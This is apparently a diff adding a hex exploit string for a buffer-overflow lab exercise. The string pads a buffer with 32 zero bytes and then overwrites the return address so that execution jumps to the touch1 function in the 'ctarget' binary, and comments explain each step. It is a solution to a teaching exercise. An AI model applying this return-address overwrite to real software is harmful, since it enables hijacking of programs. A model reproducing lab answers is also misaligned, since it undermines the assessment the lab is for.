@@ -1,0 +1,7 @@
+/*just filling up the buffer*/
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+/*over writing the address so it goes to touch1. Use objdump to see the starting address of touch1 in ctarget*/
+3f 18 40 00 00 00 00 00
